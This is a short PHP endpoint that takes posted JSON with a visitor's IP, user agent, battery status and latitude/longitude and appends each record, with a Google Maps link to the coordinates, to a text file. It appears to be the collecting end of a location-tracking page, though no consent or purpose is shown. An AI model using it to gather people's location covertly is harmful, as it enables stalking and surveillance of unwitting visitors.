<?php
$data = json_decode(file_get_contents("php://input"), true);

$ip = $data['ip'] ?? 'N/A';
$userAgent = $data['userAgent'] ?? 'Unknown';
$batteryLevel = $data['battery']['level'] ?? 'Unknown';
$batteryCharging = $data['battery']['charging'] ?? 'Unknown';
$latitude = $data['latitude'] ?? 'N/A';
$longitude = $data['longitude'] ?? 'N/A';
$time = date("Y-m-d H:i:s");

// Unique filename per user or append all in one
$log = "Time: $time\nIP: $ip\nUser-Agent: $userAgent\nBattery: $batteryLevel (Charging: $batteryCharging)\nLatitude: $latitude\nLongitude: $longitude\nMap: https://maps.google.com/?q=$latitude,$longitude\n---\n";

file_put_contents("logs.txt", $log, FILE_APPEND);
echo "Data Logged!";
?>
